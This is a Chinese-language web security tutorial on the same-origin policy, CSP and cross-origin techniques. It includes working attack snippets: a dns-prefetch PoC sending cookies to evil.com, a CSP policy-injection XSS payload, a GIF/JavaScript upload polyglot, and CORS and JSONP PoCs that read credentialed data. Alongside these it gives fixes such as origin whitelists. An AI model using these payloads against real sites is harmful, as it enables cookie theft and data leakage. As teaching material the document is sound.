### 同源策略(SOP)

浏览器的[同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)[(Same-origin policy)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
规定：非同源的 客户端脚本(主要指JavaScript) 在没明确授权的情况下，不能读写非同源的资源。

* 非同源的资源(客户端安全威胁都是围绕这些资源进行)
  * HTTP header
  * 整个DOM树(Document Object Model)
  * 浏览器存储 如Cookies、Flash Cookies、localStorage...
* 同源策略的"例外" 其实同源策略本来就没对以下跨域资源嵌入做限制(可以通过CSP限制)
  * 说明 - 可以在当前域下进行"跨域资源嵌入" 来"展示"非当前域的资源 如CSS/JavaScript/图片
  * 原理 - 因为浏览器限制了非同域资源的权限 如非同域JavaScript不能真正 读 写 非同域的资源
  * 举例
    * `<link>`标签 通常使用`href`属性来指定css资源. (因为浏览器下载css文件的同时 不会停止对当前Document的处理) 如`<link href="common.css" rel="stylesheet"/>`
    * `<img>`标签 嵌入跨域图片. 通常使用src属性来指定资源 支持图片格式PNG,JPEG,GIF,BMP,SVG...
    * `<script>`标签 嵌入跨域脚本. 通常使用src属性来指定资源. 浏览器解析到该元素时 会暂停其他资源的下载和处理(直到该资源加载且执行结束后才会继续) 下载资源并应用到当前Document中. 如`<script src ="test.js"></script>`
    * `<iframe>`标签 通常使用src属性来指定资源 会下载资源并应用到当前Document中


#### 同源策略的意义

同源策略限制了非同源的客户端脚本的权限。

* 如果浏览器没有同源策略:
  * 例1 访问mail.com并登录mailA账户 的同时也访问了另一个网站E.com，网站E.com的JavaScript可以跨域读取mail.com的cookie，即获取到了mailA账户在mail.com的登录权限
  * 例2 访问Evil.com 该站点使用JavaScript获取mail.com的表单输入框的内容 从而捕获用户输入的数据 并很容易将数据发到Evil.com 盗取对应内容

#### 判断是否同源

* 两个url有相同的protocol host port则同源
  * protocol 协议必须完全相同 如`http`与`https`互为非同源
  * host 域名必须完全相同 如`www.a.com`与`sub.a.com`与`a.com` 三者互为非同源
  * port 端口必须完全相同 如`:80`与`:443`与`:8080` 三者互为非同源

-----

### 内容安全策略(CSP)

| 对比 | SOP 同源策略 | CSP 内容安全策略|
|:----:|---|---------|
| 简介 | web安全重要基础 | 增加安全性(CSP像是SOP的额外补充) web后端需设置后浏览器才会启用 |
| 作用 | 不同源的隔离(但不管跨域资源嵌入) | CSP用白名单限制"跨域资源"的源 能够减轻XSS漏洞的危害 报告XSS攻击 |
| 执行 | 由浏览器实现 | 由浏览器实现 |

* CSP - 内容安全策略(Content Security Policy)
    * 定义 - CSP是浏览器执行的一种策略,它定义了指定页面的不同位置下,具体哪些Web应用的客户端资源(JavaScript, CSS, images, iframes...)可以被调用或执行.
    * 执行 - 浏览器会遵循(开发者设置的)CSP策略,主动阻止违规行为(block violations).
    * 白名单 - CSP其实是白名单. 即"默认都禁止 除非在策略中明确允许".
    * CSP安全评估工具 - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)由Google开发
    * W3C标准[Content Security Policy Level 3](https://w3c.github.io/webappsec-csp/) 
    * [CSP Reference & Examples](https://content-security-policy.com/)

#### 配置CSP

* 启用CSP - 开发者通过`HTTP Response`来启用CSP 同时指明具体策略
  * 方法1 通过设置Response Header 格式为`Content-Security-Policy: <policy-directive>; <policy-directive>`
  * 方法2 通过设置Response Body `meta`标签 (不建议 浏览器对它的兼容性不如方法1) `<meta http-equiv="Content-Security-Policy" content="xxx">`


* CSP指令
  * 获取指令(Fetch directives)
    * child-src
    * connect-src
    * default-src
    * font-src
    * frame-src
    * img-src
    * manifest-src
    * media-src  `<audio>` `<video>` `<track>`
    * object-src `<object>` `<embed>` `<applet>`
    * ...


#### 严格的CSP可以减轻XSS 例1
  * 攻击场景 - 攻击者利用已知XSS漏洞,构造出一个XSS攻击语句`<script src="evil.com/XSSattack1">`,注入到目标站`a.com`的html中.
  * 同源策略 - 同源策略本来就不判断`script-src`的源,也不会block某个`script-src`源. 因为攻击脚本在`script-src`中,所以攻击成功.
  * CSP - 内容安全策略中如果有`script-src 'self'`浏览器遵循CSP指令,即限制了目标站`a.com`下的`script-src`的源(仅允许script-src源为自身下的源).所以这个攻击语句(其中script-src中的源为`evil.com`)必然被阻止. 攻击失败.

#### 绕过CSP 方法1 - DNS prefetch

* 绕过原理 - CSP本来就不会完全限制DNS prefetch机制
  * CSP3有`prefetch-src`指令 可限制link标签的src的源 href的源
* 绕过过程
  * 攻击者构造输入 - 找到一处XSS漏洞 能够执行JavaScript脚本 但因严格的CSP,导致无法将数据(cookie等)发送给攻击者
  * 浏览器执行策略 - 浏览器执行相对严格的CSP策略`Content-Security-Policy: default-src 'self'`也无法限制DNS prefetch机制
  * 监听 - 攻击者在evil.com上记录DNS请求 即可得到数据(cookie等)
* 结论 - 不够严格的CSP 可被绕过实现数据泄露


实验：在 https://jsbin.com 中粘贴以下代码，进行测试
```
<html>
<head>
  <!-- CSP -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'none';prefetch-src 'self';">
</head>
<body>
  <!-- DNS prefetching test -->
<link rel="dns-prefetch" href="//111dns-prefetch-href.evil.com">
<link rel="dns-prefetch" src="//222dns-prefetch-src.evil.com">
<link rel="prefetch" href="//333prefetch-href.evil.com">
<link rel="prefetch" src="//444prefetch-src.evil.com"> 
</body>
</html>
```

测试结果: 

在chrome浏览器(版本 79.0.3945.88)中 访问 `jsbin.com`(该网站设置了CSP)
```
开发者模式 console中的内容如下:
Refused to prefetch content from 'https://333prefetch-href.evil.com/' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'prefetch-src' was not explicitly set, so 'default-src' is used as a fallback.

可知 第3种link标签会被jsbin.com设置的CSP阻止:   <link rel="prefetch" href="//333prefetch-href.evil.com">
```

然而第1种link标签 `<link rel="dns-prefetch" href="//111dns-prefetch-href.evil.com">`能够"bypass" jsbin.com设置的CSP 向evil.com发送数据.

`evil.com`成功接收到`jsbin.com`(该网站设置了CSP)发出的DNS请求的数据:
```
The Collaborator server received a DNS lookup of type A for the domain name :
111dns-prefetch-href.evil.com
```

JavaScript PoC - 实测chrome浏览器(版本 79.0.3945.88)中 可利用`vul.com`(该网站设置了CSP)的存储型XSS漏洞，"绕过"其CSP 获取到cookie

原理:构造以下代码并执行. 作用是创建link标签并添加到body dom解析该标签时 就会以dns-prefetch机制发出DNS请求(携带数据)到`evil.com`

```
var evildomain = "evil.com";
l=document.createElement('link');
document.body.appendChild(l);
l.rel="dns-prefetch";
var data1 = document.cookie.substring(1,2);//取全部或部分cookie 注意:如果data1字符串中带有分号空格等字符 需要处理以符合域名命名规范
l.href = "//" + data1 + "." + evildomain;
```

`evil.com`成功接收到`vul.com`的数据:
```
The Collaborator server received a DNS lookup of type A for the domain name :
g1.evil.com
```

#### 绕过CSP 方法2 - web应用设计问题导致策略注入

绕过Paypal的CSP(chrome) [Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
* 绕过原理 - **前提**是该web应用的设计存在缺陷 即response的`Content-Security-Policy`这个header用户可控
* 绕过过程
  * 攻击者构造输入 - 使原本的CSP策略最末尾的`report-uri /report-csp`之后跟上了"攻击者注入的策略" `;script-src-elem *` (指定`<script>`元素的有效源为`*`) 此时CSP策略变为`Content-Security-Policy: script-src 'none'; report-uri /report-csp;script-src-elem *` 
  * 浏览器执行策略 - 浏览器依据规范[CSP: script-src-elem](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-elem)中的优先级`script-src-elem` > `script-src` > `default-src` 即如果前者存在则使用前者的配置(后者配置无效) 所以这个案例中浏览器会执行`script-src-elem`的配置 不会使用策略中原本的`script-src`的配置 所以浏览器会允许`<script>`元素的有效源为`*`
  * XSSpayload `<script src="http://evil.net/xss.js"></script>` 执行成功


使用策略注入绕过CSP [在线靶场](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E) chrome下XSS成功触发


Request
```
GET /edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E HTTP/1.1
Host: portswigger-labs.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

Response
```
HTTP/1.1 200 OK
Date: Fri, 11 Oct 2019 07:01:13 GMT
Server: Apache/2.4.37 (Amazon) OpenSSL/1.0.2k-fips
X-XSS-Protection: 0
Content-Security-Policy: script-src 'none'; report-uri /test;script-src-elem *
Content-Length: 75
Connection: close
Content-Type: text/html; charset=UTF-8


<script src="http://subdomain1.portswigger-labs.net/xss/xss.js"></script>
```

#### 绕过CSP 方法3 - 策略不严格

例1 `Content-Security-Policy: default-src 'self'; script-src *;`


#### 绕过CSP 方法4 - 借助上传功能

如果web应用有上传功能，可以借助上传功能上传自定义JavaScript代码。

构造一个包含JavaScript的图片文件，内容为
```
GIF89a=//<script>
alert(1)//</script>
```

上传成功后看到该文件的域名，如果该域名符合CSP策略，则利用XSS漏洞时可"绕过"CSP执行自定义JavaScript代码。

-----


### 如何允许跨源访问-方案

* [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)"跨域资源共享"是**实现跨域的标准方法(W3C标准)**  - 允许任何http method的跨Origin请求. [了解更多](http://www.ruanyifeng.com/blog/2016/04/cors.html)

* 实现跨域的其他办法
  * JSONP - 特点:只支持GET method 且无法双向传输数据
  * `window.postMessage(message，targetOrigin)` - 该HTML5方法可从当前window对象向其他的window对象发送消息 不论这两个窗口是否同源
  * Web Sockets
  * `location.hash`与iframe 跨域传值 - 数据容量有限制 数据类型有限制
  * `window.name`与iframe 跨域数据传输 - window对象的name参数可以在多标签内共享
  * flash

### 例1 - CORS

* Request `A.com ---req--> B.com`
  * 发起请求的域 - `Origin`字段中的`http://A.com` 表示该Request是一个从`http://A.com`发起的跨域HTTP请求
  * 访问的目标域 - `Host`Header中的`B.com`就是该请求期望访问的目标域

```
GET /resources/public-data/ HTTP/1.1
Host: B.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://A.com/examples/access-control/simpleXSInvocation.html
Origin: http://A.com
```

* Response `A.com <--resp--- B.com`
  * 目标域(被访问的)通过自身后端设置header`Access-Control-Allow-Origin`来决定 接受来自哪些域的请求:
    * `B.com`给出的响应中 如果有header`Access-Control-Allow-Origin: *` 则表示:`B.com`的资源 可以接收并响应来自任何域的request
    * `B.com`给出的响应中 如果有header`Access-Control-Allow-Origin: http://A.com` 则表示:`B.com`的资源 只可以接收并响应来自指定域`http://A.com`的request
  * 注意
    * 只有`B.com`给出的响应中 HTTP响应头 `Access-Control-Allow-Origin` 里明确指定了允许 `http://A.com` 访问 `http://B.com` 的资源时，`http://A.com`网站的客户端脚本才有权(通过XHR等)对目标域 `http://B.com` 上的资源进行读写操作。

```
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61 
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

[XML Data]
```

----

* 使用CORS实现跨域 常见的**安全风险**
  * B.com的`Access-Control-Allow-Origin: *`可以接收并响应来自任何域的request 存在**巨大风险**. 应该设置"源域名白名单"
* CORS attack
  * 步骤(1)如攻击者在evil.com(或被目标站CORS信任的任意域)上编写"实现CORS跨域的代码"(可参考PoC1 PoC2)
  * 步骤(2)正常用户 登录B.com
  * 步骤(3)正常用户 访问evil.com (因为B.com后端的CORS未正确配置)所以evil.com向B.com发出跨域请求得到了B.com的响应,evil获取到了B.com的数据.

PoC1:
```javascript
var invocation = new XMLHttpRequest();

  invocation.onreadystatechange = function() {
    if (invocation.readyState == XMLHttpRequest.DONE) {
      alert(invocation.response);
    }
  }

function cors(){
  if(invocation) {
    invocation.open('GET', "https://www.B.com/content-paywall/api/accesslevel", true);
    invocation.withCredentials = true;
    invocation.send(); 
  }
}

cors();
```

PoC2:
```html
<h2>CORS To Read the response body of a vulnerable site</h2>
<div id="demo">
<button type="button" onclick="cors()">XHR</button>
</div>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = document.write(this.responseText);
    }
  };
  xhttp.open("GET", "https://chat.vulnerable.com/v2/get-messages?conversationId=469104576&pageSize=3", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
```


* 使用CORS实现跨域 **安全的方案(修复方案)**
  * 业务"后端"实现`Origin`白名单,把信任的域加入`Origin`白名单. 如果HTTP request中的`Origin`不在白名单内,则对应的HTTP Response不带这2个Header.
    * 对Origin如果不信任，则HTTP Response不带这2个Header
    * `Access-Control-Allow-Origin: white.com`
    * `Access-Control-Allow-Credentials: true`

### 例2 - JSON with Padding

* 根本原因 - JSONP可以"跨域"的根本原因是`<script>`标签能够("绕过"同源策略)请求其他域名的资源 如`<script src="http://www.3.com/jquery.js"></script>`
* 理解 - json是目的 JSONP是手段 Padding指的是callback(回调函数)
* 大致过程 - 域A.com下的JavaScript脚本 从域A.com发送HTTP请求到域B.com 得到B.com的响应 响应内容为json格式的数据(这样的数据符合JavaScript语法)  此时域A.com下的JavaScript脚本 得到的具体数据 并把它作为实参 传递给域A.com下的回调函数 实现使用数据

首先在域A.com的前端 有JavaScript脚本如下:

```javascript
// 在body中添加一个 <script>标签
var tag_script = document.createElement('script');
tag_script.src = 'http://database.B.com/info?callback_name=foo'; // A.com告诉外部的服务器B 回调函数的函数名是foo .即要求B.com的响应 能在A.com下的JavaScript脚本里执行 如foo({"token": "XXXX"}); 
// 为什么不能直接写成json数据 如`{"token": "XXXX"}`呢? 因为在JavaScript上下文里 这样写无法调用任何函数. 即无法实现调用回调函数foo
document.body.appendChild(tag_script);

// foo函数 是域A.com的一个函数.
// 当B.com的后端 响应"数据"后, A.com的JavaScript会调用名为foo的回调函数(callback)
function foo(data) {
console.log('[A.com] Your token is: ' + data.token);
};
```

* JSONP详细步骤分析
  * 域A.com有一个`script`标签 `src`属性的值为域B.com下的`http://database.B.com/info?callback_name=foo` 即从域A.com发出GET请求到域B.com URL中的参数callback_name的参数值为`foo` 三个字母组成的字符串.
  * 非同域 域B.com的后端 得到了刚刚从域A.com发出的GET请求 也就得到了来自域A的字符串`foo` (`foo` 其实是函数名, 是域A.com的客户端JavaScript代码中定义的回调函数的函数名)
  * 非同域 域B.com的后端 设置响应内容为`foo({"token": "XXXX"});` 这样做是为了把具体数据返回给域A.com下的JavaScript
    * 注意域B.com的Response Header中Content-Type的值必须是JavaScript  即`text/javascript`或`application/javascript`
  * 域A.com的JavaScript脚本 得到响应内容 `foo({"token": "XXXX"});`
  * 域A.com的JavaScript脚本 把json数据 `{"token": "XXXX"}`作为实参 传入域A.com下的名为`foo`的函数(域A.com下早已定义了这个回调函数)

就这样通过JSONP的方式实现了: 域A.com 的JavaScript脚本拿到了来自 域B.com的数据 `{"token": "XXXX"}` 是json格式的数据

* 使用JSONP实现跨域 常见**安全风险**
  * **JSONP Injection**
    * 前提条件:B.com没有校验request header `origin` `Referer`的值是否为可信的域(A.com), 就响应了"数据", 则B.com存在JSONP Injection漏洞.
    * 利用方式:攻击者参考域A.com的jsonp代码(正常业务)，在攻击者的域evil.C.com下构造JavaScript代码发出请求(访问域B.com的数据), 即可在在攻击者的域evil.C.com下获取到B.com的响应内容 `foo({"token": "XXXX"});`

已知B.com存在JSONP Injection漏洞时,在攻击者的域evil.C.com下使用JavaScript代码,可获取来自B.com的数据:
```javascript
<script>
function foo(data){ // The function is named `foo`. It is a callback function.
	alert("[evil.C.com] Your token is: " + data.token);
}

</script>

<script src="http://database.B.com/info?callback_name=foo"></script>
```

### 例3 - JSON with Padding(jQuery实现)

jQuery可以使用匿名函数

```
$.ajax({
    url:"http://database.B.com/open.php?callback=?",
    dataType:"jsonp",
    success:function(data){
        console.log(data);
        //ToDo..
    }
});
```

### 例4 - 利用window.name与iframe实现跨域

跨域传输数据原理：window对象的name参数可以在多标签内共享

在域a.com的a.html中创建iframe标签并设置`iframe.src`为b.com(外域)的地址`iframe.src = 'http://b.com/b.html';`

在b.com(外域)的b.html中设置`window.name = 'xxx';`

此时在域a.com的a.html中,能获取到刚才在b.com(外域)设置的`window.name`


a.com的a.html的内容:
```
<script>
var iframe = document.createElement('iframe');//在域a.com下创建一个iframe元素

iframe.src="https://b.com/b.html"; //在域a.com下的/a.html 设置这个iframe元素的src属性的值为http://b.com/b.html

document.body.appendChild(iframe);


iframe.onload=function(){

// 在a.com下 得到来自外域b.com的数据

var data1 = iframe.contentWindow.name;
var data2 = iframe.contentWindow.location.href;

alert(data1);
alert(data2);

console.log("get data:",data1);
console.log("get data:",data2);

}
</script>
```

b.com的b.html的内容:
```
<script>
    // 需要传输的数据
    // 数据格式可以自定义:json 字符串...
    // 数据量：一般为2M，Firefox下约32M
    window.name = 'data_in_domain_b.com';
</script>
```

### 例5 - window.postMessage

`window.postMessage(message，targetOrigin)` - 该HTML5方法可从当前window对象向其他的window对象发送消息 不论这两个窗口是否同源

```
message 为将要发送的消息，消息类型只能为字符串
targetOrigin 用来指定即将接收到消息的window对象所在的那个域 (可以使用通配符`*`不限定域)
```

* 在线演示 - 使用`window.postMessage`跨域
  * 页面 https://1135.github.io/sites/demo_postMessage/index.html
  * 源码 https://github.com/1135/1135.github.io/tree/master/sites/demo_postMessage/index.html

* 使用`window.postMessage`跨域传输数据 常见**安全风险**
  * XSS漏洞 - 产生原因:没有验证数据来源的域(即`MessageEvent.origin`的值),就直接接受数据并进行业务逻辑处理. 如https://github.com/github/securitylab/issues/118

* 使用`window.postMessage`跨域传输数据 **安全的方案(修复方案)**
  * 步骤1.确定白名单 - 根据业务逻辑确定"数据来源的域"白名单,在前端JavaScript(浏览器端)中使用这个白名单.
  * 步骤2.验证来源域 - 在业务前端对"数据来源的域"进行验证,如使用`indexOf`或`startsWith`来验证`MessageEvent.origin`的值,确认它是白名单内可信域名之一,才进行业务逻辑处理.

### 例6 - location.hash与iframe

html中的锚链接
```
<a href='#简介'>click</a>
```

如在本页面中跳转到"简介": 开发者模式输入 `location.hash="#简介"`
